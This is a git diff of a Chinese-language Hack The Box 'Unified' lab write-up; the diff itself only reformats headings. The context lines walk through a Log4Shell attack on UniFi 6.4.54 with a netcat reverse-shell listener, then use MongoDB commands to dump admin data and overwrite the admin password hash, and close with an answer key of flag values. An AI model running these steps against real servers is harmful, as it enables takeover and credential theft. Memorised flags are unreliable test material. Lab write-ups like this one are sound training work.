@@ -1,11 +1,9 @@
 ---
-title: Hack the box Unified题解
+title: Unified
 ---
-# Hack the box Unified题解
-
 > 打这个靶机的时候也是断断续续的，所以里面的目标IP前后对应不上，但是方法都是一样的。
 
-# 扫端口
+## 扫端口
 
 ```shell
 nmap -sC -sV 10.129.96.149
@@ -17,9 +15,9 @@ nmap -sC -sV 10.129.96.149
 
 看到是 `unifi6.4.54`版本的，结合官方给的WP知道这个版本有一个CVE，可以以此为出发点进行攻击
 
-# CVE-2021-44228的利用
+## CVE-2021-44228的利用
 
-## 验证漏洞存在
+### 验证漏洞存在
 
 先验证是不是存在这个漏洞
 
@@ -33,9 +31,9 @@ nmap -sC -sV 10.129.96.149
 
 ![image-20230404214952373](https://alpha-blog-1300014916.cos.ap-guangzhou.myqcloud.com/img/image-20230404214952373.png)
 
-## 实施攻击
+### 实施攻击
 
-### 漏洞利用环境搭建
+#### 漏洞利用环境搭建
 
 > 更新&&安装环境
 >
@@ -57,7 +55,7 @@ nmap -sC -sV 10.129.96.149
 
 ![image-20230404222733175](https://alpha-blog-1300014916.cos.ap-guangzhou.myqcloud.com/img/image-20230404222733175.png)
 
-### 开始攻击
+#### 开始攻击
 
 首先对 `payload`进行 `base64`编码，以防止出现其他的编码问题
 
@@ -93,9 +91,9 @@ nc -lnvp 4444
 
 ![image-20230404223823350](https://alpha-blog-1300014916.cos.ap-guangzhou.myqcloud.com/img/image-20230404223823350.png)
 
-## 信息收集
+### 信息收集
 
-### MongoDB数据库
+#### MongoDB数据库
 
 任务八问 `MongoDB`跑在哪个端口上，用命令查看，发现是在27117端口上
 
@@ -126,31 +124,31 @@ mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
 
 ![image-20230404230727942](https://alpha-blog-1300014916.cos.ap-guangzhou.myqcloud.com/img/image-20230404230727942.png)
 
-### 更新密码
+#### 更新密码
 
 ```shell
 mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$W8lv9ywfFDfMVM8a$CPn2fYW3L2rlWhKQy8kuef8Vs/SHgwfwhr18ZzJ/K3OMWZeNmMrpoAaranjl/q3.7K3VYZHBPdp2EVnQB3Jq00"}})'
 ```
 
-### 登录后台
+#### 登录后台
 
 用更新了的密码成功登录后台
 
 ![image-20230404231823711](https://alpha-blog-1300014916.cos.ap-guangzhou.myqcloud.com/img/image-20230404231823711.png)
 
-### 找ssh密码
+#### 找ssh密码
 
 > 点击那个齿轮图标，然后点击Site，滑到页面最底部看到ssh的密码，点那个眼睛可以看到密码
 
 ![image-20230404232536565](https://alpha-blog-1300014916.cos.ap-guangzhou.myqcloud.com/img/image-20230404232536565.png)
 
-### ssh连接
+#### ssh连接
 
 > 到这就完事了，`user.txt`在 `/home/michael`目录下
 
 ![image-20230404232956730](https://alpha-blog-1300014916.cos.ap-guangzhou.myqcloud.com/img/image-20230404232956730.png)
 
-# 答案
+## 答案
 
 > 1. 22,6789,8080,8443
 > 2. UniFi Network
@@ -167,7 +165,7 @@ mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb00
 > 13. 6ced1a6a89e666c0620cdb10262ba127
 > 14. e50bc93c75b634e4b272d2f771c33681
 
-# 参考博客
+## 参考博客
 
 - [HackTheBox - Unified](https://blog.csdn.net/qq_45862635/article/details/125350250)
 - [hack the box靶场unified靶机](https://blog.csdn.net/zr1213159840/article/details/123697698)
